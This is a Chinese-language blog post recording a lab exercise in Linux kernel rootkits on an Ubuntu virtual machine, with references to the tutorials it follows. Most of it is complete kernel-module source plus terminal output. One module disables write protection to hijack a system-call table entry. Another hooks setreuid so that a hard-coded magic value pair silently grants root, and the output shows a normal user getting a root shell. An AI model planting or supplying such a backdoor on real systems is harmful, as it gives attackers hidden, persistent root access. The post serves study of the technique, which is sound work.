---
title: r00tk1t init
date: 2017-01-12 21:33:55
categories:
- study
- misc
tags:
- exploit
- C/C++
- r00tk1t
---

参考:
[http://www.freebuf.com/articles/system/54263.html](http://www.freebuf.com/articles/system/54263.html)
[https://chirath02.wordpress.com/tag/asmlinkage/](https://chirath02.wordpress.com/tag/asmlinkage/)
[r00tk1t基础实验](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd)
[https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/](https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/)
[https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/](https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/)
[http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf](http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf)
[https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/](https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/)

<!--more-->


# What's this?
关于其概念可以参考[维基百科](https://en.wikipedia.org/wiki/Rootkit)。

# 实验环境
建议不要在物理机下实验~因此我根据[这里](https://chirath02.wordpress.com/tag/asmlinkage/)介绍的情况便去ubuntu的官方网站下载了ubuntu 15.10的i386镜像。然后用VMWare安装ISO，便开始按照里面的指令进行修改和编译。其中增加的系统调用是根据上述的[r00tk1t](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd)增加的。修改系统调用是主要的方式之一，因此可以借鉴。

# 编译部分
为了方便可以直接在虚拟机里面切换到root用户，然后键入`# apt-get source linux-image-$(uname -r)`即可下载虚拟机本内核源代码。然后cp到/usr/src目录，再解压出来。然后安装编译所需要的一些依赖工具。
```bash
$ sudo apt-get update
$ sudo apt-get build-dep linux-image-$(uname -r)
$ sudo apt-get install kernel-package  # for make-kpkg clean
$ sudo apt-get install libncurses-dev  # for make menuconfig
```
再之后按照教程部分增加系统调用，照葫芦画瓢。然后就`make menuconfig`配置内核编译选项，教程给的是默认(不知道修改是否编译快一些)。而后便可以开始漫长的编译过程了。
```bash
sudo make
sudo make modules_install˖
sudo make install
sudo mkinitramfs -o /boot/initrd.img-2.6.32.65
sudo update-initramfs -c -k 2.6.32.65
sudo update-grub2 

sudo vim /etc/default/grub     //注释掉下面的部分
#GRUB_HIDDEN_TIMEOUT=0
sudo update-grub2 
```
上述参考mallocfree的教程。可以使得不用完全覆盖掉原有内核选项而使得grub增加新的选项来供用户选择。
按照教程第一部分部分结果如下:至少我们工程的从内核任务链表中实现了相应的功能。
```bash
root@r00t:~# uname -r
4.2.2
root@r00t:~# ps aux | grep sshd
root       655  0.0  0.5  10432  5320 ?        Ss   20:13   0:00 /usr/sbin/sshd -D
root      1144  0.0  0.6  13652  6268 ?        Ss   20:13   0:00 sshd: r00t [priv]   
r00t      1209  0.1  0.2  13652  2948 ?        S    20:13   0:00 sshd: r00t@pts/8    
root      1248  0.0  0.6  13652  6196 ?        Ss   20:14   0:00 sshd: r00t [priv]   
r00t      1285  0.0  0.2  13652  2960 ?        S    20:14   0:00 sshd: r00t@pts/9    
root      1330  0.0  0.2   5972  2308 pts/8    S+   20:19   0:00 grep --color=auto sshd
root@r00t:~# ./testPname 
Enter process to find
sshd
PID = 655
         PID = 1144
                   PID = 1209
                             PID = 1248
                                       PID = 1285
                                                 System call returned 0
root@r00t:~# 


```
# LKM
按照freebuf的教程第一个LKM程序编译如下:
```bash
root@r00t:~/LKM# make
make -C /lib/modules/4.2.2/build SUBDIRS=/root/LKM modules
make[1]: Entering directory '/usr/src/linux-4.2.2'
  CC [M]  /root/LKM/lkm.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/LKM/lkm.mod.o
  LD [M]  /root/LKM/lkm.ko
make[1]: Leaving directory '/usr/src/linux-4.2.2'
root@r00t:~/LKM# insmod lkm.ko 
root@r00t:~/LKM# dmesg | tail -n 1
[ 4019.602327] Arciryas:module loaded
root@r00t:~/LKM# lsmod | grep lkm
lkm                    16384  0
root@r00t:~/LKM# rmmod lkm.ko
root@r00t:~/LKM# dmesg | tail -n 2
[ 4019.602327] Arciryas:module loaded
[ 4117.988381] Arciryas:module removed
root@r00t:~/LKM# 
```

# Kernel Hook
- 静态的方式获得syscall表的地址
```bash
root@r00t:~# !cat
cat /boot/System.map-4.2.2 | grep sys_call_table
c1755140 R sys_call_table
root@r00t:~# 

```
- hook代码如下,稍微大概解释以下，内核模块在初始化的时候会检查sys\_call\_table的内存地址是否可写，一般情况下肯定是不能写的，上面的System.map文件中也看到的，因此程序会检查并通过改写其对应的内存页读写属性来强行修改表借此来hook。在模块卸载的时候又将原来的地址修改回来。
```bash

root@r00t:~/LKM/pname# cat captainhook.c
#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/pgtable_types.h>
#include <linux/highmem.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("rutk1t0r");
/*MY sys_call_table address*/
//c1755140
void **system_call_table_addr;
/*my custom syscall that takes process name*/
asmlinkage int (*custom_syscall) (char* name);
/*hook*/
asmlinkage int captain_hook(char* play_here) {
    /*do whatever here (print "HAHAHA", reverse their string, etc)
        But for now we will just print to the dmesg log*/
    printk(KERN_INFO "Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!");
    return custom_syscall(play_here);
}
/*Make page writeable*/
int make_rw(unsigned long address){
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if(pte->pte &~_PAGE_RW){
        pte->pte |=_PAGE_RW;
    }
    return 0;
}
/* Make the page write protected */
int make_ro(unsigned long address){
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    return 0;
}
static int __init entry_point(void){
    printk(KERN_INFO "Captain Hook loaded successfully..\n");
    /*MY sys_call_table address*/
    system_call_table_addr = (void*)0xc1755140;
    /* Replace custom syscall with the correct system call name (write,open,etc) to hook*/
    custom_syscall = system_call_table_addr[__NR_pname];
    /*Disable page protection*/
    make_rw((unsigned long)system_call_table_addr);
    /*Change syscall to our syscall function*/
    system_call_table_addr[__NR_pname] = captain_hook;
    return 0;
}
static int __exit exit_point(void){
        printk(KERN_INFO "Unloaded Captain Hook successfully\n");
    /*Restore original system call */
    system_call_table_addr[__NR_pname] = custom_syscall;
    /*Renable page protection*/
    make_ro((unsigned long)system_call_table_addr);
    return 0;
}
module_init(entry_point);
module_exit(exit_point);
```
- 结果如下:
```bash
root@r00t:~/LKM/pname# insmod captainhook.ko
root@r00t:~/LKM/pname# cd
root@r00t:~# ./testPname 
Enter process to find
sshd
PID = 655
         PID = 1144
                   PID = 1209
                             PID = 1248
                                       PID = 1285
                                                 System call returned 0
root@r00t:~# rmmod captainhook
root@r00t:~# 

## dmesg中输出如下:
[ 1月13 21:49] Captain Hook loaded successfully..
[ 1月13 21:50] Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!
[ +11.875845] Unloaded Captain Hook successfully

```
# 动态获取系统调用表
依照[这篇文章](https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/)复制过来的代码以及编译运行的结果如下,对于我的虚拟机ubuntu 15.10的4.2.2的内核而言，我修改了模块代码的两个地方(因为这两个地方报错)。第一处是kmalloc和kfree函数未实现，因此加入`#include <linux/slab.h>`头文件即可。第二处是new结构体指针的uid和gid几个字段赋值强转失败，查看源码后改为宏`GLOBAL_ROOT_UID`和`GLOBAL_ROOT_GID`即可。而以下代码的大体意思就是动态地在模块被加载的时候hook掉setreuid系统调用，硬编码写死一个触发条件`if ((ruid == 7310) && (euid == 0137))`即应用层传递过来的参数如果满足即可根据cred来获取root权限。因此如果被种植类似这样的后门是很危险的，只要低权限账户运行test程序即可获取root权限。
```bash

r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls
kernel_sys.c  Makefile  test.c
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat kernel_sys.c 
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

#define PROC_V          "/proc/version"
#define BOOT_PATH       "/boot/System.map-"
 
#define MAX_LEN         256
 
unsigned long *syscall_table; 
int sys_found = 0;
 
asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);
 
asmlinkage int new_setreuid (uid_t ruid, uid_t euid) {
 
    struct cred *new;
 
     if ((ruid == 7310) && (euid == 0137))   {
 
         printk(KERN_ALERT "[Correct] \n");
 
        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)    
                                 
            current->uid = current -> gid = 0;
            current -> euid = current -> egid = 0;
            current -> suid = current -> sgid = 0;
            current -> fsuid = current -> fsgid = 0;
 
        #else
 
            new = prepare_creds();
 
            if ( new != NULL ) {
 
                new->uid = GLOBAL_ROOT_UID;
		new->gid = GLOBAL_ROOT_GID;
                new->euid = GLOBAL_ROOT_UID;
		new->egid = GLOBAL_ROOT_GID;
                new->suid = GLOBAL_ROOT_UID;
		new->sgid = GLOBAL_ROOT_GID;
                new->fsuid = GLOBAL_ROOT_UID;
		new->fsgid = GLOBAL_ROOT_GID;
 
                commit_creds(new);
            }
        #endif
 
         return orig_setreuid (0, 0);
     }
 
     return orig_setreuid (ruid, euid);
}
 
char *search_file(char *buf) {
     
    struct file *f;
    char *ver;
    mm_segment_t oldfs;
 
    oldfs = get_fs();
    set_fs (KERNEL_DS);
     
    f = filp_open(PROC_V, O_RDONLY, 0);
     
    if ( IS_ERR(f) || ( f == NULL )) {
     
        return NULL;
     
    }
     
    memset(buf, 0, MAX_LEN);
     
    vfs_read(f, buf, MAX_LEN, &f->f_pos);
     
    ver = strsep(&buf, " ");
    ver = strsep(&buf, " ");
    ver = strsep(&buf, " ");
         
    filp_close(f, 0);   
    set_fs(oldfs);
     
    return ver;
 
}
 
static int find_sys_call_table (char *kern_ver)
 {
 
    char buf[MAX_LEN];
    int i = 0;
    char *filename;
    char *p;
    struct file *f = NULL;
 
    mm_segment_t oldfs;
 
    oldfs = get_fs();
    set_fs (KERNEL_DS);
     
    filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);
     
    if ( filename == NULL ) {
     
        return -1;
     
    }
     
    memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);
     
    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
    strncat(filename, kern_ver, strlen(kern_ver));
     
    printk(KERN_ALERT "\nPath %s\n", filename);
     
    f = filp_open(filename, O_RDONLY, 0);
     
    if ( IS_ERR(f) || ( f == NULL )) {
     
        return -1;
     
    }
 
    memset(buf, 0x0, MAX_LEN);
 
    p = buf;
 
    while (vfs_read(f, p+i, 1, &f->f_pos) == 1) {
 
        if ( p[i] == '\n' || i == 255 ) {
         
            i = 0;
             
            if ( (strstr(p, "sys_call_table")) != NULL ) {
                 
                char *sys_string;
                 
                sys_string = kmalloc(MAX_LEN, GFP_KERNEL);  
                 
                if ( sys_string == NULL ) { 
                 
                    filp_close(f, 0);
                    set_fs(oldfs);
     
                    kfree(filename);
     
                    return -1;
     
                }
 
                memset(sys_string, 0, MAX_LEN);
                strncpy(sys_string, strsep(&p, " "), MAX_LEN);
             
                syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);
                 
                kfree(sys_string);
                 
                break;
            }
             
            memset(buf, 0x0, MAX_LEN);
            continue;
        }
         
        i++;
     
    }
 
    filp_close(f, 0);
    set_fs(oldfs);
     
    kfree(filename);
 
    return 0;
}
 
static int init(void) {
 
    char *kern_ver;
    char *buf;
     
    buf = kmalloc(MAX_LEN, GFP_KERNEL);
     
    if ( buf == NULL ) {
     
        sys_found = 1;
        return -1;
     
    }   
 
    printk(KERN_ALERT "\nHIJACK INIT\n");
 
    kern_ver = search_file(buf);
         
    if ( kern_ver == NULL ) {
 
        sys_found = 1;
        return -1;
     
    }
     
    printk(KERN_ALERT "Kernel version found: %s\n", kern_ver);
     
    if ( find_sys_call_table(kern_ver) == -1 ) {
     
        sys_found = 1;
        return -1;
    }
 
    sys_found = 0;
     
    write_cr0 (read_cr0 () & (~ 0x10000));
     
    orig_setreuid = syscall_table[__NR_setreuid32];
    syscall_table[__NR_setreuid32] = new_setreuid;
 
    write_cr0 (read_cr0 () | 0x10000);
     
    kfree(buf);
     
    return 0;
}
 
static void exit(void) {
     
    if ( sys_found == 0 ) {
     
        write_cr0 (read_cr0 () & (~ 0x10000));
 
        syscall_table[__NR_setreuid32] = orig_setreuid;
 
        write_cr0 (read_cr0 () | 0x10000);
     
    }
     
    printk(KERN_ALERT "\nHIJACK EXIT\n");
 
    return;
}
 
 
module_init(init);
module_exit(exit);
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ make
make -C /lib/modules/4.2.2/build SUBDIRS=/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable modules
make[1]: Entering directory '/usr/src/linux-4.2.2'
  CC [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.o
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In function ‘find_sys_call_table’:
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:33: warning: cast to pointer from integer of different size [-Wint-to-pointer-cast]
                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);
                                 ^
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:31: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]
                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);
                               ^
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In function ‘init’:
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:231:19: warning: assignment makes pointer from integer without a cast [-Wint-conversion]
     orig_setreuid = syscall_table[__NR_setreuid32];
                   ^
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:232:36: warning: assignment makes integer from pointer without a cast [-Wint-conversion]
     syscall_table[__NR_setreuid32] = new_setreuid;
                                    ^
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In function ‘exit’:
/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:247:40: warning: assignment makes integer from pointer without a cast [-Wint-conversion]
         syscall_table[__NR_setreuid32] = orig_setreuid;
                                        ^
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.mod.o
  LD [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.ko
make[1]: Leaving directory '/usr/src/linux-4.2.2'
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat test.c 
#include <stdio.h>
 
int main () {
 
        setreuid (7310, 0137);
        system ("/bin/sh");
 
        return 0;
}
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ id
uid=1000(r00t) gid=1000(r00t) groups=1000(r00t),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls
kernel_sys.c   kernel_sys.mod.c  kernel_sys.o  modules.order   test.c
kernel_sys.ko  kernel_sys.mod.o  Makefile      Module.symvers
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ sudo insmod kernel_sys.ko
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ dmesg | tail -n 4
               HIJACK INIT
[ 2537.374798] Kernel version found: 4.2.2
[ 2537.374802] 
               Path /boot/System.map-4.2.2
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ gcc -o test test.c 
test.c: In function ‘main’:
test.c:5:9: warning: implicit declaration of function ‘setreuid’ [-Wimplicit-function-declaration]
         setreuid (7310, 0137);
         ^
test.c:6:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
         system ("/bin/sh");
         ^
r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ./test 
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(r00t)
#

```


# 总结
后续实验应该会参照谷大神的[教程](https://github.com/NoviceLive/research-rootkit)继续学习，关于其防范策略目前还没有什么非常好用的方法，只能靠管理员多注意了。在后渗透测试阶段此隐蔽性非常强，特别是内核级的相对于应用级的更加难以发现，其中有一个应用级的用bash实现的可以[参考学习](https://github.com/cloudsec/brootkit)。
